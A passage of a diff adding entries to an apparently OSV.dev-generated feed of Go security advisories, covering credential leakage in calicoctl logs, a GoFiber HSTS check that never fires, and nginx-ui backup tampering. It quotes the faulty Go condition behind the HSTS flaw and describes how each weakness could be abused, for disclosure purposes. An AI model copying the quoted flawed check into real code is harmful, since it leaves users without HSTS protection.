+The fix coerces `email_verified` across bool, string and numeric types (fail-closed) and blocks the email fallback when the matche…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/security/advisories/GHSA-75vm-6w67-gwvp"&gt;https://github.com/coder/coder/security/advisories/GHSA-75vm-6w67-gwvp&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder"&gt;https://github.com/coder/coder&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-75vm-6w67-gwvp"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] GHSA-3m4q-ggcj-j6m4: Calico Inserts Sensitive Information into Log File</title>
+    <id>https://osv.dev/vulnerability/GHSA-3m4q-ggcj-j6m4</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-3m4q-ggcj-j6m4"/>
+    <published>2026-05-28T18:30:32Z</published>
+    <updated>2026-07-06T20:59:28Z</updated>
+    <category term="Go"/>
+    <category term="CVE-2026-6720"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Calico Inserts Sensitive Information into Log File&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-6720&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:P/VC:H/VI:N/VA:N/SC:H/SI:H/SA:H&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;github.com/projectcalico/calicoctl/v3&lt;/code&gt; — fixed in 3.31.6&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;When calicoctl is invoked with --log-level=info or --log-level=debug, the client prints the full contents of its loaded connection-configuration struct to stderr in a single log line. The struct embeds every credential calicoctl uses to talk to the cluster — inline kubeconfig (with bearer token), Kubernetes API bearer token, etcd password, and inline PEM-encoded etcd client certificate and key. Any reader of that stderr stream — CI job logs, session-recording archives, shared support-ticket transcripts, or local filesystem viewers on the host that ran calicoctl — can extract these credentials with zero Kubernetes privilege. calicoctl&amp;#x27;s default log level is panic, so this issue only triggers when verbose logging is explicitly enabled.&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6720"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-6720&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/projectcalico/calico/pull/12535"&gt;https://github.com/projectcalico/calico/pull/12535&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/projectcalico/calico/pull/12536"&gt;https://github.com/projectcalico/calico/pull/12536&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/projectcalico/calico/pull/12537"&gt;https://github.com/projectcalico/calico/pull/12537&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/projectcalico/calico/commit/12908bb48a5bf8cbab5373f4d532509a30cf9b7f"&gt;https://github.com/projectcalico/calico/commit/12908bb48a5bf8cbab5373f4d532509a30cf9b7f&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/projectcalico/calico/commit/8d87eddcb5eb6efc70c09eb0a33d63137359ea70"&gt;https://github.com/projectcalico/calico/commit/8d87eddcb5eb6efc70c09eb0a33d63137359ea70&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/projectcalico/calico/commit/ce3ab2b39b5841757cbccf7922c895c47827f562"&gt;https://github.com/projectcalico/calico/commit/ce3ab2b39b5841757cbccf7922c895c47827f562&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/projectcalico/calico"&gt;https://github.com/projectcalico/calico&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-3m4q-ggcj-j6m4"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-gv83-gqw6-9j2c: GoFiber never set HSTS header in helmet middleware due to incorrect protocol check</title>
+    <id>https://osv.dev/vulnerability/GHSA-gv83-gqw6-9j2c</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-gv83-gqw6-9j2c"/>
+    <published>2026-07-06T20:43:12Z</published>
+    <updated>2026-07-06T20:45:09Z</updated>
+    <category term="Go"/>
+    <category term="CVE-2026-53624"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;GoFiber never set HSTS header in helmet middleware due to incorrect protocol check&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-53624&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;github.com/gofiber/fiber&lt;/code&gt; — fixed in 3.4.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+The `helmet` middleware in gofiber/fiber never sets the `Strict-Transport-Security` (HSTS) response header, even when `HSTSMaxAge` is explicitly configured, because the condition check at `helmet.go:67` uses `c.Protocol()` — which returns the HTTP protocol version string (e.g., `&amp;quot;HTTP/1.1&amp;quot;`, `&amp;quot;HTTP/2.0&amp;quot;`) — instead of `c.Scheme()` — which returns the URL scheme (`&amp;quot;http&amp;quot;` or `&amp;quot;https&amp;quot;`). Since `c.Protocol()` never equals `&amp;quot;https&amp;quot;` in any real deployment, the HSTS header is permanently disabled, defeating the security protection.
+
+### Details
+
+**Root cause:** `middleware/helmet/helmet.go`, line 67:
+
+```go
+if c.Protocol() == &amp;quot;https&amp;quot; &amp;amp;&amp;amp; cfg.HSTSMaxAge != 0 {
+```
+
+`c.Protocol()` (defined at `req.go:865-867`) delegates to `fasthttp.Request.Header.Protocol()`, which returns the HTTP p…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/gofiber/fiber/security/advisories/GHSA-gv83-gqw6-9j2c"&gt;https://github.com/gofiber/fiber/security/advisories/GHSA-gv83-gqw6-9j2c&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/gofiber/fiber"&gt;https://github.com/gofiber/fiber&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-gv83-gqw6-9j2c"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] GHSA-fhh2-gg7w-gwpq: nginx-ui Backup Restore Allows Tampering with Encrypted Backups</title>
+    <id>https://osv.dev/vulnerability/GHSA-fhh2-gg7w-gwpq</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-fhh2-gg7w-gwpq"/>
+    <published>2026-03-30T16:23:34Z</published>
+    <updated>2026-07-06T19:45:08Z</updated>
+    <category term="Go"/>
+    <category term="CVE-2026-33026"/>
+    <category term="GO-2026-4903"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;nginx-ui Backup Restore Allows Tampering with Encrypted Backups&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-33026, GO-2026-4903&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;github.com/0xJacky/Nginx-UI&lt;/code&gt; — fixed in 1.9.10-0.20260315015203-f61bcec547c0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
+The `nginx-ui` backup restore mechanism allows attackers to tamper with encrypted backup archives and inject malicious configuration during restoration.
+
+## Details
+The backup format lacks a trusted integrity root. Although files are encrypted, the encryption key and IV are provided to the client and the integrity metadata (`hash_info.txt`) is encrypted using the same key. As a result, an attacker who can access the backup token can decrypt the archive, modify its contents, recompute integrity hashes, and re-encrypt the bundle.
+
+Because the restore process does not enforce integrity verification and accepts backups even when hash mismatches are detected, the system restores attacker-controlled configuration even when integrity verification warnings are raised. In certain configu…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-fhh2-gg7w-gwpq"&gt;https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-fhh2-gg7w-gwpq&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33026"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-33026&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/0xJacky/nginx-ui/commit/f61bcec547c0f305e35348d6440ef156c1d5c3cb"&gt;https://github.com/0xJacky/nginx-ui/commit/f61bcec547c0f305e35348d6440ef156c1d5c3cb&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/0xJacky/nginx-ui"&gt;https://github.com/0xJacky/nginx-ui&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.4"&gt;https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.4&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-g9w5-qffc-6762"&gt;https://github.com/advisories/GHSA-g9w5-qffc-6762&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pkg.go.dev/vuln/GO-2026-4903"&gt;https://pkg.go.dev/vuln/GO-2026-4903&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-fhh2-gg7w-gwpq"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
   <entry>
     <title>[UPDATED] GHSA-xvq9-4vpv-227m: Nginx-UI vulnerable to arbitrary file write through the Import Certificate feature</title>
     <id>https://osv.dev/vulnerability/GHSA-xvq9-4vpv-227m</id>
